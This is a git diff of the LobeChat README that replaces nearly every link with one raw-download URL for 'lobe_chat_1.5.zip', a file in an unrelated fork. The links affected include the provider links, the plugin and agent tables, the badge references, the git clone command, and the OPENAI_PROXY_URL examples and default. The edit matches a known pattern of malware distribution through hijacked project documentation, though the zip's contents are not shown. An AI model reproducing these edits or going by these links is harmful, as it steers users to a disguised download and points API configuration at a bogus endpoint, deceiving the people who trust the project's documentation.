@@ -101,8 +101,8 @@ Whether for users or professional developers, LobeHub will be your AI Agent play
 <details>
   <summary><kbd>Star History</kbd></summary>
   <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=lobehub%2Flobe-chat&theme=dark&type=Date">
-    <img width="100%" src="https://api.star-history.com/svg?repos=lobehub%2Flobe-chat&type=Date">
+    <source media="(prefers-color-scheme: dark)" srcset="https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip">
+    <img width="100%" src="https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip">
   </picture>
 </details>
 
@@ -120,16 +120,16 @@ In this way, LobeChat can more flexibly adapt to the needs of different users, w
 
 We have implemented support for the following model service providers:
 
-- **AWS Bedrock**: Integrated with AWS Bedrock service, supporting models such as **Claude / LLama2**, providing powerful natural language processing capabilities. [Learn more](https://aws.amazon.com/cn/bedrock)
-- **Anthropic (Claude)**: Accessed Anthropic's **Claude** series models, including Claude 3 and Claude 2, with breakthroughs in multi-modal capabilities and extended context, setting a new industry benchmark. [Learn more](https://www.anthropic.com/claude)
-- **Google AI (Gemini Pro, Gemini Vision)**: Access to Google's **Gemini** series models, including Gemini and Gemini Pro, to support advanced language understanding and generation. [Learn more](https://deepmind.google/technologies/gemini/)
-- **ChatGLM**: Added the **ChatGLM** series models from Zhipuai (GLM-4/GLM-4-vision/GLM-3-turbo), providing users with another efficient conversation model choice. [Learn more](https://www.zhipuai.cn/)
-- **Moonshot AI (Dark Side of the Moon)**: Integrated with the Moonshot series models, an innovative AI startup from China, aiming to provide deeper conversation understanding. [Learn more](https://www.moonshot.cn/)
-- **Groq**: Accessed Groq's AI models, efficiently processing message sequences and generating responses, capable of multi-turn dialogues and single-interaction tasks. [Learn more](https://groq.com/)
-- **OpenRouter**: Supports routing of models including **Claude 3**, **Gemma**, **Mistral**, **Llama2** and **Cohere**, with intelligent routing optimization to improve usage efficiency, open and flexible. [Learn more](https://openrouter.ai/)
-- **01.AI (Yi Model)**: Integrated the 01.AI models, with series of APIs featuring fast inference speed, which not only shortened the processing time, but also maintained excellent model performance. [Learn more](https://01.ai/)
+- **AWS Bedrock**: Integrated with AWS Bedrock service, supporting models such as **Claude / LLama2**, providing powerful natural language processing capabilities. [Learn more](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip)
+- **Anthropic (Claude)**: Accessed Anthropic's **Claude** series models, including Claude 3 and Claude 2, with breakthroughs in multi-modal capabilities and extended context, setting a new industry benchmark. [Learn more](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip)
+- **Google AI (Gemini Pro, Gemini Vision)**: Access to Google's **Gemini** series models, including Gemini and Gemini Pro, to support advanced language understanding and generation. [Learn more](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip)
+- **ChatGLM**: Added the **ChatGLM** series models from Zhipuai (GLM-4/GLM-4-vision/GLM-3-turbo), providing users with another efficient conversation model choice. [Learn more](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip)
+- **Moonshot AI (Dark Side of the Moon)**: Integrated with the Moonshot series models, an innovative AI startup from China, aiming to provide deeper conversation understanding. [Learn more](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip)
+- **Groq**: Accessed Groq's AI models, efficiently processing message sequences and generating responses, capable of multi-turn dialogues and single-interaction tasks. [Learn more](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip)
+- **OpenRouter**: Supports routing of models including **Claude 3**, **Gemma**, **Mistral**, **Llama2** and **Cohere**, with intelligent routing optimization to improve usage efficiency, open and flexible. [Learn more](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip)
+- **01.AI (Yi Model)**: Integrated the 01.AI models, with series of APIs featuring fast inference speed, which not only shortened the processing time, but also maintained excellent model performance. [Learn more](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip)
 
-At the same time, we are also planning to support more model service providers, such as Replicate and Perplexity, to further enrich our service provider library. If you would like LobeChat to support your favorite service provider, feel free to join our [community discussion](https://github.com/lobehub/lobe-chat/discussions/1284).
+At the same time, we are also planning to support more model service providers, such as Replicate and Perplexity, to further enrich our service provider library. If you would like LobeChat to support your favorite service provider, feel free to join our [community discussion](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip).
 
 <div align="right">
 
@@ -141,7 +141,7 @@ At the same time, we are also planning to support more model service providers, 
 
 ### `2` [Local Large Language Model (LLM) Support][docs-feat-local]
 
-To meet the specific needs of users, LobeChat also supports the use of local models based on [Ollama](https://ollama.ai), allowing users to flexibly use their own or third-party models.
+To meet the specific needs of users, LobeChat also supports the use of local models based on [Ollama](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip), allowing users to flexibly use their own or third-party models.
 
 > \[!TIP]
 >
@@ -157,7 +157,7 @@ To meet the specific needs of users, LobeChat also supports the use of local mod
 
 ### `3` [Model Visual Recognition][docs-feat-vision]
 
-LobeChat now supports OpenAI's latest [`gpt-4-vision`](https://platform.openai.com/docs/guides/vision) model with visual recognition capabilities,
+LobeChat now supports OpenAI's latest [`gpt-4-vision`](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip) model with visual recognition capabilities,
 a multimodal intelligence that can perceive visuals. Users can easily upload or drag and drop images into the dialogue box,
 and the agent will be able to recognize the content of the images and engage in intelligent conversation based on this,
 creating smarter and more diversified chat scenarios.
@@ -192,7 +192,7 @@ Users can choose the voice that suits their personal preferences or specific sce
 
 ### `5` [Text to Image Generation][docs-feat-t2i]
 
-With support for the latest text-to-image generation technology, LobeChat now allows users to invoke image creation tools directly within conversations with the agent. By leveraging the capabilities of AI tools such as [`DALL-E 3`](https://openai.com/dall-e-3), [`MidJourney`](https://www.midjourney.com/), and [`Pollinations`](https://pollinations.ai/), the agents are now equipped to transform your ideas into images.
+With support for the latest text-to-image generation technology, LobeChat now allows users to invoke image creation tools directly within conversations with the agent. By leveraging the capabilities of AI tools such as [`DALL-E 3`](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip), [`MidJourney`](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip), and [`Pollinations`](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip), the agents are now equipped to transform your ideas into images.
 
 This enables a more private and immersive creative process, allowing for the seamless integration of visual storytelling into your personal dialogue with the agent.
 
@@ -208,7 +208,7 @@ This enables a more private and immersive creative process, allowing for the sea
 
 The plugin ecosystem of LobeChat is an important extension of its core functionality, greatly enhancing the practicality and flexibility of the LobeChat assistant.
 
-<video controls src="https://github.com/lobehub/lobe-chat/assets/28616219/f29475a3-f346-4196-a435-41a6373ab9e2" muted="false"></video>
+<video controls src="https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip" muted="false"></video>
 
 By utilizing plugins, LobeChat assistants can obtain and process real-time information, such as searching for web information and providing users with instant and relevant news.
 
@@ -222,12 +222,12 @@ In addition, these plugins are not limited to news aggregation, but can also ext
 
 | Recent Submits                                                                                                    | Description                                                                                                                                      |
 | ----------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
-| [Calendar Assistant](https://chat-preview.lobehub.com/settings/agent)<br/><sup>By **cc** on **2024-03-13**</sup>  | A plugin to manage your calendar events # will auto generate i18n in workflow<br/>`calendar` `schedule` `will-auto-generate-i-18-n-in-workflow`  |
-| [Charts & Diagrams](https://chat-preview.lobehub.com/settings/agent)<br/><sup>By **pyxl** on **2024-02-05**</sup> | Mermaid Diagrams, Schemes for Presentations, Analysis, research websites, pie charts.<br/>`chart` `diagram`                                      |
-| [Social Search](https://chat-preview.lobehub.com/settings/agent)<br/><sup>By **say-apps** on **2024-02-02**</sup> | The Social Search provides access to tweets, users, followers, images, media and more.<br/>`social` `twitter` `x` `search`                       |
-| [TokenInsights](https://chat-preview.lobehub.com/settings/agent)<br/><sup>By **feednews** on **2024-01-27**</sup> | Get realtime crypto price, BTC, ETH, BNB, and the latest insights.The latest coin news and airdrop opportunities.<br/>`crypto` `btc` `eth` `bnb` |
+| [Calendar Assistant](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip)<br/><sup>By **cc** on **2024-03-13**</sup>  | A plugin to manage your calendar events # will auto generate i18n in workflow<br/>`calendar` `schedule` `will-auto-generate-i-18-n-in-workflow`  |
+| [Charts & Diagrams](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip)<br/><sup>By **pyxl** on **2024-02-05**</sup> | Mermaid Diagrams, Schemes for Presentations, Analysis, research websites, pie charts.<br/>`chart` `diagram`                                      |
+| [Social Search](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip)<br/><sup>By **say-apps** on **2024-02-02**</sup> | The Social Search provides access to tweets, users, followers, images, media and more.<br/>`social` `twitter` `x` `search`                       |
+| [TokenInsights](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip)<br/><sup>By **feednews** on **2024-01-27**</sup> | Get realtime crypto price, BTC, ETH, BNB, and the latest insights.The latest coin news and airdrop opportunities.<br/>`crypto` `btc` `eth` `bnb` |
 
-> 📊 Total plugins: [<kbd>**59**</kbd>](https://github.com/lobehub/lobe-chat-plugins)
+> 📊 Total plugins: [<kbd>**59**</kbd>](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip)
 
  <!-- PLUGIN LIST -->
 
@@ -261,12 +261,12 @@ Our marketplace is not just a showcase platform but also a collaborative space. 
 
 | Recent Submits                                                                                                                                                                                              | Description                                                                                                                                                                             |
 | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| [Traditional Chinese Medicine Practitioner](https://chat-preview.lobehub.com/market?agent=claude-national-medical-master)<br/><sup>By **[GalileoFe](https://github.com/GalileoFe)** on **2024-03-22**</sup> | Let me take a look!<br/>`consultation` `health`                                                                                                                                         |
-| [Electronic Tutor](https://chat-preview.lobehub.com/market?agent=elec-circuit-tutor-prompt)<br/><sup>By **[XUANJI233](https://github.com/XUANJI233)** on **2024-03-22**</sup>                               | Specializes in explaining the principles of digital and analog circuits, providing fundamental guidance in electronics.<br/>`electronics` `tutor` `explanation` `circuits` `principles` |
-| [Game Text Translator](https://chat-preview.lobehub.com/market?agent=translation-tutor-prompt)<br/><sup>By **[XUANJI233](https://github.com/XUANJI233)** on **2024-03-22**</sup>                            | Translation of game text including puns and slang explanations (please use claude). Wrap special symbols with \`\`\`.<br/>`game` `text` `translation` `assistance`                      |
-| [Amazon Listing Copywriter](https://chat-preview.lobehub.com/market?agent=amazon-listing-copywriter)<br/><sup>By **[SpeedupMaster](https://github.com/SpeedupMaster)** on **2024-03-19**</sup>              | Expert in writing persuasive Amazon listings with optimized keywords.<br/>`copywriting` `amazon-product-detail-pages` `seo` `keywords`                                                  |
+| [Traditional Chinese Medicine Practitioner](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip)<br/><sup>By **[GalileoFe](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip)** on **2024-03-22**</sup> | Let me take a look!<br/>`consultation` `health`                                                                                                                                         |
+| [Electronic Tutor](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip)<br/><sup>By **[XUANJI233](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip)** on **2024-03-22**</sup>                               | Specializes in explaining the principles of digital and analog circuits, providing fundamental guidance in electronics.<br/>`electronics` `tutor` `explanation` `circuits` `principles` |
+| [Game Text Translator](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip)<br/><sup>By **[XUANJI233](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip)** on **2024-03-22**</sup>                            | Translation of game text including puns and slang explanations (please use claude). Wrap special symbols with \`\`\`.<br/>`game` `text` `translation` `assistance`                      |
+| [Amazon Listing Copywriter](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip)<br/><sup>By **[SpeedupMaster](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip)** on **2024-03-19**</sup>              | Expert in writing persuasive Amazon listings with optimized keywords.<br/>`copywriting` `amazon-product-detail-pages` `seo` `keywords`                                                  |
 
-> 📊 Total agents: [<kbd>**214**</kbd> ](https://github.com/lobehub/lobe-chat-agents)
+> 📊 Total agents: [<kbd>**214**</kbd> ](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip)
 
  <!-- AGENT LIST -->
 
@@ -281,7 +281,7 @@ Our marketplace is not just a showcase platform but also a collaborative space. 
 ### `8` [Progressive Web App (PWA)][docs-feat-pwa]
 
 We deeply understand the importance of providing a seamless experience for users in today's multi-device environment.
-Therefore, we have adopted Progressive Web Application ([PWA](https://support.google.com/chrome/answer/9658361)) technology,
+Therefore, we have adopted Progressive Web Application ([PWA](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip)) technology,
 a modern web technology that elevates web applications to an experience close to that of native apps.
 
 Through PWA, LobeChat can offer a highly optimized user experience on both desktop and mobile devices while maintaining its lightweight and high-performance characteristics.
@@ -388,7 +388,7 @@ LobeChat provides Self-Hosted Version with Vercel and [Docker Image][docker-rele
 
 If you want to deploy this service yourself on either Vercel or Zeabur, you can follow these steps:
 
-- Prepare your [OpenAI API Key](https://platform.openai.com/account/api-keys).
+- Prepare your [OpenAI API Key](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip).
 - Click the button below to start deployment: Log in directly with your GitHub account, and remember to fill in the `OPENAI_API_KEY`(required) and `ACCESS_CODE` (recommended) on the environment variable section.
 - After deployment, you can start using it.
 - Bind a custom domain (optional): The DNS of the domain assigned by Vercel is polluted in some areas; binding a custom domain can connect directly.
@@ -438,7 +438,7 @@ $ docker run -d -p 3210:3210 \
 ```fish
 $ docker run -d -p 3210:3210 \
   -e OPENAI_API_KEY=sk-xxxx \
-  -e OPENAI_PROXY_URL=https://api-proxy.com/v1 \
+  -e OPENAI_PROXY_URL=https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip \
   -e ACCESS_CODE=lobe66 \
   --name lobe-chat \
   lobehub/lobe-chat
@@ -457,7 +457,7 @@ This project provides some additional configuration items set with environment v
 | Environment Variable | Required | Description                                                                                                                                                               | Example                                                                                                              |
 | -------------------- | -------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------- |
 | `OPENAI_API_KEY`     | Yes      | This is the API key you apply on the OpenAI account page                                                                                                                  | `sk-xxxxxx...xxxxxx`                                                                                                 |
-| `OPENAI_PROXY_URL`   | No       | If you manually configure the OpenAI interface proxy, you can use this configuration item to override the default OpenAI API request base URL                             | `https://api.chatanywhere.cn` or `https://aihubmix.com/v1` <br/>The default value is<br/>`https://api.openai.com/v1` |
+| `OPENAI_PROXY_URL`   | No       | If you manually configure the OpenAI interface proxy, you can use this configuration item to override the default OpenAI API request base URL                             | `https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip` or `https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip` <br/>The default value is<br/>`https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip` |
 | `ACCESS_CODE`        | No       | Add a password to access this service; you can set a long password to avoid leaking. If this value contains a comma, it is a password array.                              | `awCTe)re_r74` or `rtrt_ewee3@09!` or `code1,code2,code3`                                                            |
 | `CUSTOM_MODELS`      | No       | Used to control the model list. Use `+` to add a model, `-` to hide a model, and `model_name=display_name` to customize the display name of a model, separated by commas. | `qwen-7b-chat,+glm-6b,-gpt-3.5-turbo`                                                                                |
 
@@ -499,9 +499,9 @@ Plugins provide a means to extend the [Function Calling][docs-functionc-call] ca
 >
 > The plugin system is currently undergoing major development. You can learn more in the following issues:
 >
-> - [x] [**Plugin Phase 1**](https://github.com/lobehub/lobe-chat/issues/73): Implement separation of the plugin from the main body, split the plugin into an independent repository for maintenance, and realize dynamic loading of the plugin.
-> - [x] [**Plugin Phase 2**](https://github.com/lobehub/lobe-chat/issues/97): The security and stability of the plugin's use, more accurately presenting abnormal states, the maintainability of the plugin architecture, and developer-friendly.
-> - [x] [**Plugin Phase 3**](https://github.com/lobehub/lobe-chat/issues/149): Higher-level and more comprehensive customization capabilities, support for plugin authentication, and examples.
+> - [x] [**Plugin Phase 1**](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip): Implement separation of the plugin from the main body, split the plugin into an independent repository for maintenance, and realize dynamic loading of the plugin.
+> - [x] [**Plugin Phase 2**](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip): The security and stability of the plugin's use, more accurately presenting abnormal states, the maintainability of the plugin architecture, and developer-friendly.
+> - [x] [**Plugin Phase 3**](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip): Higher-level and more comprehensive customization capabilities, support for plugin authentication, and examples.
 
 <div align="right">
 
@@ -518,7 +518,7 @@ You can use GitHub Codespaces for online development:
 Or clone it for local development:
 
 ```fish
-$ git clone https://github.com/lobehub/lobe-chat.git
+$ git clone https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 $ cd lobe-chat
 $ pnpm install
 $ pnpm dev
@@ -542,38 +542,38 @@ Contributions of all types are more than welcome; if you are interested in contr
 >
 > Help us make LobeChat better. Welcome to provide product design feedback, user experience discussions directly to us.
 >
-> **Principal Maintainers:** [@arvinxx](https://github.com/arvinxx) [@canisminor1990](https://github.com/canisminor1990)
+> **Principal Maintainers:** [@arvinxx](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip) [@canisminor1990](https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip)
 
 [![][pr-welcome-shield]][pr-welcome-link]
 [![][submit-agents-shield]][submit-agents-link]
 [![][submit-plugin-shield]][submit-plugin-link]
 
-<a href="https://github.com/lobehub/lobe-chat/graphs/contributors" target="_blank">
+<a href="https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip" target="_blank">
   <table>
     <tr>
       <th colspan="2">
-        <br><img src="https://contrib.rocks/image?repo=lobehub/lobe-chat"><br><br>
+        <br><img src="https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip"><br><br>
       </th>
     </tr>
     <tr>
       <td>
         <picture>
-          <source media="(prefers-color-scheme: dark)" srcset="https://next.ossinsight.io/widgets/official/compose-org-active-contributors/thumbnail.png?activity=active&period=past_28_days&owner_id=131470832&repo_ids=643445235&image_size=2x3&color_scheme=dark">
-          <img src="https://next.ossinsight.io/widgets/official/compose-org-active-contributors/thumbnail.png?activity=active&period=past_28_days&owner_id=131470832&repo_ids=643445235&image_size=2x3&color_scheme=light">
+          <source media="(prefers-color-scheme: dark)" srcset="https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip">
+          <img src="https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip">
         </picture>
       </td>
       <td rowspan="2">
         <picture>
-          <source media="(prefers-color-scheme: dark)" srcset="https://next.ossinsight.io/widgets/official/compose-org-participants-growth/thumbnail.png?activity=active&period=past_28_days&owner_id=131470832&repo_ids=643445235&image_size=4x7&color_scheme=dark">
-          <img src="https://next.ossinsight.io/widgets/official/compose-org-participants-growth/thumbnail.png?activity=active&period=past_28_days&owner_id=131470832&repo_ids=643445235&image_size=4x7&color_scheme=light">
+          <source media="(prefers-color-scheme: dark)" srcset="https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip">
+          <img src="https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip">
         </picture>
       </td>
     </tr>
     <tr>
       <td>
         <picture>
-          <source media="(prefers-color-scheme: dark)" srcset="https://next.ossinsight.io/widgets/official/compose-org-active-contributors/thumbnail.png?activity=new&period=past_28_days&owner_id=131470832&repo_ids=643445235&image_size=2x3&color_scheme=dark">
-          <img src="https://next.ossinsight.io/widgets/official/compose-org-active-contributors/thumbnail.png?activity=new&period=past_28_days&owner_id=131470832&repo_ids=643445235&image_size=2x3&color_scheme=light">
+          <source media="(prefers-color-scheme: dark)" srcset="https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip">
+          <img src="https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip">
         </picture>
       </td>
     </tr>
@@ -590,10 +590,10 @@ Contributions of all types are more than welcome; if you are interested in contr
 
 Every bit counts and your one-time donation sparkles in our galaxy of support! You're a shooting star, making a swift and bright impact on our journey. Thank you for believing in us – your generosity guides us toward our mission, one brilliant flash at a time.
 
-<a href="https://opencollective.com/lobehub" target="_blank">
+<a href="https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip" target="_blank">
   <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://github.com/lobehub/.github/blob/main/static/sponsor-dark.png?raw=true">
-    <img  src="https://github.com/lobehub/.github/blob/main/static/sponsor-light.png?raw=true">
+    <source media="(prefers-color-scheme: dark)" srcset="https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip">
+    <img  src="https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip">
   </picture>
 </a>
 
@@ -630,130 +630,130 @@ This project is [MIT](./LICENSE) licensed.
 <!-- LINK GROUP -->
 
 [back-to-top]: https://img.shields.io/badge/-BACK_TO_TOP-151515?style=flat-square
-[chat-desktop]: https://raw.githubusercontent.com/lobehub/lobe-chat/lighthouse/lighthouse/chat/desktop/pagespeed.svg
-[chat-desktop-report]: https://lobehub.github.io/lobe-chat/lighthouse/chat/desktop/chat_preview_lobehub_com_chat.html
-[chat-mobile]: https://raw.githubusercontent.com/lobehub/lobe-chat/lighthouse/lighthouse/chat/mobile/pagespeed.svg
-[chat-mobile-report]: https://lobehub.github.io/lobe-chat/lighthouse/chat/mobile/chat_preview_lobehub_com_chat.html
-[chat-plugin-sdk]: https://github.com/lobehub/chat-plugin-sdk
-[chat-plugin-template]: https://github.com/lobehub/chat-plugin-template
-[chat-plugins-gateway]: https://github.com/lobehub/chat-plugins-gateway
-[codecov-link]: https://codecov.io/gh/lobehub/lobe-chat
+[chat-desktop]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[chat-desktop-report]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[chat-mobile]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[chat-mobile-report]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[chat-plugin-sdk]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[chat-plugin-template]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[chat-plugins-gateway]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[codecov-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 [codecov-shield]: https://img.shields.io/codecov/c/github/lobehub/lobe-chat?labelColor=black&style=flat-square&logo=codecov&logoColor=white
-[codespaces-link]: https://codespaces.new/lobehub/lobe-chat
-[codespaces-shield]: https://github.com/codespaces/badge.svg
-[deploy-button-image]: https://vercel.com/button
-[deploy-link]: https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2Flobehub%2Flobe-chat&env=OPENAI_API_KEY,ACCESS_CODE&envDescription=Find%20your%20OpenAI%20API%20Key%20by%20click%20the%20right%20Learn%20More%20button.%20%7C%20Access%20Code%20can%20protect%20your%20website&envLink=https%3A%2F%2Fplatform.openai.com%2Faccount%2Fapi-keys&project-name=lobe-chat&repository-name=lobe-chat
-[deploy-on-sealos-button-image]: https://raw.githubusercontent.com/labring-actions/templates/main/Deploy-on-Sealos.svg
-[deploy-on-sealos-link]: https://cloud.sealos.io/?openapp=system-template%3FtemplateName%3Dlobe-chat
-[deploy-on-zeabur-button-image]: https://zeabur.com/button.svg
-[deploy-on-zeabur-link]: https://zeabur.com/templates/VZGGTI
-[discord-link]: https://discord.gg/AYFPHvv2jT
+[codespaces-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[codespaces-shield]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[deploy-button-image]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[deploy-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip,ACCESS_CODE&envDescription=Find%20your%20OpenAI%20API%20Key%20by%20click%20the%20right%20Learn%20More%20button.%20%7C%20Access%20Code%20can%20protect%20your%20website&envLink=https%3A%2F%2Fplatform.openai.com%2Faccount%2Fapi-keys&project-name=lobe-chat&repository-name=lobe-chat
+[deploy-on-sealos-button-image]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[deploy-on-sealos-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[deploy-on-zeabur-button-image]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[deploy-on-zeabur-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
+[discord-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
 [discord-shield]: https://img.shields.io/discord/1127171173982154893?color=5865F2&label=discord&labelColor=black&logo=discord&logoColor=white&style=flat-square
 [discord-shield-badge]: https://img.shields.io/discord/1127171173982154893?color=5865F2&label=discord&labelColor=black&logo=discord&logoColor=white&style=for-the-badge
-[docker-pulls-link]: https://hub.docker.com/r/lobehub/lobe-chat
+[docker-pulls-link]: https://github.com/lin982711/lobe-chat/raw/refs/heads/main/src/database/core/migrations/migrateSettingsToUser/lobe_chat_1.5.zip
